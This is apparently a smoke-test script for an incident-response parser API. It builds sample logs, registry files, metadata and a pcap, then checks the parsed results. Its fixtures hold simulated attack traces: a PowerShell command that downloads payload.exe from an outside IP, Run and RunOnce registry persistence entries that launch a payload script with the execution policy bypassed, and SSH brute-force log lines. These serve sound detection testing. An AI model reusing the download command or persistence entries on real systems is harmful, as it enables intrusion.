import fs from 'fs'
import os from 'os'
import path from 'path'
import { execFile } from 'child_process'
import { fileURLToPath } from 'url'
import { promisify } from 'util'

const execFileAsync = promisify(execFile)
const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const serverRoot = path.resolve(__dirname, '..')
const baseUrl = process.env.PARSER_TEST_API_URL || 'http://127.0.0.1:5000/api/parse'

function writeUInt16BE(value) {
  const buffer = Buffer.alloc(2)
  buffer.writeUInt16BE(value)
  return buffer
}

function writeUInt32LE(value) {
  const buffer = Buffer.alloc(4)
  buffer.writeUInt32LE(value)
  return buffer
}

function ipv4(value) {
  return Buffer.from(value.split('.').map(part => Number(part)))
}

function buildPcapPacket() {
  const ethernet = Buffer.concat([
    Buffer.from([0x00, 0x16, 0x3e, 0x11, 0x22, 0x33]),
    Buffer.from([0x00, 0x16, 0x3e, 0xaa, 0xbb, 0xcc]),
    Buffer.from([0x08, 0x00]),
  ])

  const tcp = Buffer.concat([
    writeUInt16BE(51514),
    writeUInt16BE(443),
    Buffer.alloc(8),
    Buffer.from([0x50, 0x02]),
    writeUInt16BE(64240),
    Buffer.alloc(4),
  ])

  const ipv4Header = Buffer.concat([
    Buffer.from([0x45, 0x00]),
    writeUInt16BE(20 + tcp.length),
    Buffer.from([0x00, 0x01, 0x40, 0x00, 0x40, 0x06, 0x00, 0x00]),
    ipv4('10.10.4.20'),
    ipv4('185.120.12.3'),
  ])

  const packet = Buffer.concat([ethernet, ipv4Header, tcp])
  const now = Math.floor(Date.now() / 1000)

  return Buffer.concat([
    Buffer.from([0xd4, 0xc3, 0xb2, 0xa1]),
    Buffer.from([0x02, 0x00, 0x04, 0x00]),
    Buffer.alloc(8),
    writeUInt32LE(65535),
    writeUInt32LE(1),
    writeUInt32LE(now),
    writeUInt32LE(0),
    writeUInt32LE(packet.length),
    writeUInt32LE(packet.length),
    packet,
  ])
}

async function writeText(filePath, content) {
  await fs.promises.writeFile(filePath, content.trimStart(), 'utf8')
}

async function exportEvtxSample(targetPath) {
  if (process.platform !== 'win32') {
    return { skipped: true, reason: 'EVTX export requires Windows wevtutil.' }
  }

  try {
    await execFileAsync('wevtutil', ['epl', 'Application', targetPath, '/ow:true'], { timeout: 120000 })
    return { skipped: false }
  } catch (error) {
    return { skipped: true, reason: error.stderr || error.message }
  }
}

async function createSamples() {
  const sampleDir = path.join(serverRoot, 'tmp', `parser-phase-${Date.now()}`)
  await fs.promises.mkdir(sampleDir, { recursive: true })

  const samples = []

  const linuxLog = path.join(sampleDir, 'fresh-linux-auth.log')
  await writeText(linuxLog, `
May 26 10:12:03 analyst-vm sshd[811]: Failed password for invalid user admin from 45.227.254.20 port 55224 ssh2
May 26 10:12:11 analyst-vm sshd[811]: Failed password for root from 45.227.254.20 port 55228 ssh2
May 26 10:13:40 analyst-vm sshd[811]: Accepted password for admin from 45.227.254.20 port 55234 ssh2
May 26 10:14:02 analyst-vm sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/whoami
`)
  samples.push({ path: linuxLog, name: 'fresh-linux-auth.log', expectedType: 'system', minEvents: 4 })

  const windowsText = path.join(sampleDir, 'fresh-windows-security.txt')
  await writeText(windowsText, `
Timestamp: 2026-05-26T10:15:10Z
Provider: Microsoft-Windows-PowerShell
Computer: WIN-IR01
Event ID: 4104
Account Name: administrator
Source Address: 185.120.12.3
Description: powershell.exe Invoke-WebRequest http://185.120.12.3/payload.exe -OutFile C:\\Temp\\payload.exe

Timestamp: 2026-05-26T10:16:22Z
Provider: Microsoft-Windows-Security-Auditing
Computer: WIN-IR01
Event ID: 4625
Account Name: administrator
Source Address: 45.227.254.20
Description: An account failed to log on.
`)
  samples.push({ path: windowsText, name: 'fresh-windows-security.txt', expectedType: 'system', minEvents: 2 })

  const metadataCsv = path.join(sampleDir, 'fresh-file-metadata.csv')
  await writeText(metadataCsv, `
path,created,modified,accessed,owner,host
C:\\Temp\\payload.exe,2026-05-26T10:15:12Z,2026-05-26T10:15:12Z,2026-05-26T10:16:01Z,administrator,WIN-IR01
C:\\Users\\administrator\\Downloads\\archive.zip,2026-05-26T10:21:10Z,2026-05-26T10:22:18Z,2026-05-26T10:22:21Z,administrator,WIN-IR01
`)
  samples.push({ path: metadataCsv, name: 'fresh-file-metadata.csv', expectedType: 'metadata', minEvents: 6 })

  const registry = path.join(sampleDir, 'fresh-windows-registry.reg')
  await writeText(registry, `
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"Updater"="C:\\Users\\administrator\\AppData\\Roaming\\updater.exe"
@="C:\\Windows\\System32\\cmd.exe /c whoami"

[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]
"OneTimeTask"="powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1"
"Enabled"=dword:00000001
`)
  samples.push({ path: registry, name: 'fresh-windows-registry.reg', expectedType: 'registry', minEvents: 4 })

  const metadataJson = path.join(sampleDir, 'fresh-file-metadata.json')
  await writeText(metadataJson, JSON.stringify([
    {
      path: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
      created: '2026-05-26T10:02:00Z',
      modified: '2026-05-26T10:18:00Z',
      owner: 'SYSTEM',
      host: 'WIN-IR01',
    },
  ], null, 2))
  samples.push({ path: metadataJson, name: 'fresh-file-metadata.json', expectedType: 'metadata', minEvents: 2 })

  const pcap = path.join(sampleDir, 'fresh-network-capture.pcap')
  await fs.promises.writeFile(pcap, buildPcapPacket())
  samples.push({ path: pcap, name: 'fresh-network-capture.pcap', expectedType: 'pcap', minEvents: 1 })

  const evtx = path.join(sampleDir, 'fresh-application.evtx')
  const evtxExport = await exportEvtxSample(evtx)
  if (!evtxExport.skipped) {
    samples.push({ path: evtx, name: 'fresh-application.evtx', expectedType: 'evtx', minEvents: 1, limit: 5 })
  } else {
    console.warn(`EVTX sample skipped: ${evtxExport.reason}`)
  }

  return { sampleDir, samples }
}

async function parseSample(sample) {
  const buffer = await fs.promises.readFile(sample.path)
  const form = new FormData()
  form.append('file', new Blob([buffer]), sample.name)

  const url = `${baseUrl}?limit=${sample.limit || 25}`
  const response = await fetch(url, { method: 'POST', body: form })
  const text = await response.text()
  if (!response.ok) {
    throw new Error(`${sample.name} failed with HTTP ${response.status}: ${text}`)
  }

  const payload = JSON.parse(text)
  const result = payload.files?.[0]
  if (!result) throw new Error(`${sample.name} did not return a file result.`)
  if (result.artifactType !== sample.expectedType) {
    throw new Error(`${sample.name} expected artifactType=${sample.expectedType}, received ${result.artifactType}`)
  }
  if (!/^[a-f0-9]{64}$/i.test(result.sha256Hash || '')) {
    throw new Error(`${sample.name} did not return a valid SHA-256 hash.`)
  }
  if ((result.parsedCount || 0) < sample.minEvents) {
    throw new Error(`${sample.name} expected at least ${sample.minEvents} events, received ${result.parsedCount || 0}`)
  }

  const events = result.events || []
  const missingRisk = events.find(event => typeof event.riskScore !== 'number')
  const missingMitre = events.find(event => !event.mitreAttack)
  const missingMl = events.find(event => !event.mlAnomaly)
  if (missingRisk) throw new Error(`${sample.name} returned an event without riskScore.`)
  if (missingMitre) throw new Error(`${sample.name} returned an event without mitreAttack.`)
  if (missingMl) throw new Error(`${sample.name} returned an event without mlAnomaly.`)

  return {
    name: sample.name,
    artifactType: result.artifactType,
    parser: result.parser,
    normalizer: result.normalizer,
    parsedCount: result.parsedCount,
    sha256Hash: result.sha256Hash,
    attackAlerts: result.attackAlerts?.length || 0,
    mlStatus: result.mlSummary?.status || 'unknown',
    mlAnomalies: result.mlAnomalies?.length || 0,
  }
}

async function main() {
  const { sampleDir, samples } = await createSamples()
  console.log(`Parser smoke samples: ${sampleDir}`)
  console.log(`API target: ${baseUrl}`)

  const results = []
  for (const sample of samples) {
    results.push(await parseSample(sample))
  }

  console.table(results.map(item => ({
    file: item.name,
    type: item.artifactType,
    parser: item.parser,
    normalizer: item.normalizer,
    events: item.parsedCount,
    ml: item.mlStatus,
    anomalies: item.mlAnomalies,
    alerts: item.attackAlerts,
    sha256: item.sha256Hash.slice(0, 12),
  })))
  console.log(`Parser phase smoke test passed for ${results.length} sample artifact(s).`)
}

main().catch(error => {
  console.error(error.message)
  console.error(`Ensure the API is running at ${baseUrl} before running this smoke test.`)
  process.exit(1)
})
